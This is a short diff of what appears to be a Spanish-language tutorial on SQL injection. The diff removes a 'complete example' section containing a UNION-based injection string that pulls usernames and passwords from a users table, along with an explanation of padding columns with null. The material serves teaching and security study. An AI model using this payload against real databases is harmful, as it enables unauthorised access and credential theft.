@@ -285,19 +285,6 @@ Esto mostrará los usuarios y contraseñas (o hashes) almacenados.
 
 ---
 
-## Ejemplo completo
-
-Consulta original:
-
-SELECT id, name, description FROM products WHERE id = '1'
-
-Inyección:
-
-1' UNION SELECT username, password, null FROM users--
-
-Aquí, null rellena la columna que no quieres mostrar.
-
----
 
 ## Otros trucos útiles
 
